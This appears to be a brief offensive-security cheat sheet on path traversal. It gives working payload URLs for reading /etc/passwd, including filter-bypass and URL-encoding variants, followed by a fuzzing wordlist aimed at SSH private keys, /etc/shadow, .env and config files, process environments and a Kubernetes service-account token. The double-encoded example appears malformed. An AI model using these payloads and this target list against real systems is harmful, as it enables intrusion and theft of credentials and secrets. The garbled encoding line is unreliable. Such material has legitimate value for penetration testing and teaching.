This attack typically takes advantage of insufficient input validation or sanitization mechanisms. By manipulating the input, an attacker can traverse directories and access sensitive files that should not be directly accessible. This could include system files, configuration files, or even user data.

For example, if a web application allows users to download files by specifying a file name in the URL, an attacker could provide a malicious input such as `../../../etc/passwd` to traverse up the directory tree and access the password file.

That can be useful if, for example, the web has a php file with a variable called `filename`.
In this case, we could make a request attempting to access other files, such as `/etc/passwd`.

```bash
http://example.com/?filename=../../../../../../etc/passwd
```
In some cases the php code can be blocking this attack switching "../" with "". In this case we could try to do:
```bash
http://example.com/?....//....//....//....//....//etc/passwd
```
Sometimes, if the previous method doesn't work, it can be useful to URL-encode the request or URL-encode it twice.
```bash
..%25df..%25df..%25df..%25df..%25df..%25df..%25df..%25dfetc/passwd
```


----

## Path traversal wordlist 

Use this as a base for fuzzing or manual testing.

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/fstab
/etc/issue

/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/id_ecdsa
/root/.ssh/id_ed25519
/root/.ssh/authorized_keys

/home/user/.bash_history
/home/user/.ssh/id_rsa
/home/user/.ssh/id_ecdsa
/home/user/.ssh/id_ed25519
/home/user/.ssh/authorized_keys

/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php

/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/syslog
/var/log/auth.log

/proc/self/environ
/proc/self/cmdline
/proc/version

/opt/app/config.yml
/opt/app/.env
/opt/project/.env

/tmp/id_rsa
/tmp/config.php
/var/backups/
/var/backups/passwd.bak

/usr/local/apache2/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf

/var/lib/mysql/mysql/user.MYD
/var/lib/postgresql/data/pg_hba.conf

/run/secrets/
/var/run/secrets/
/var/run/secrets/kubernetes.io/serviceaccount/token
```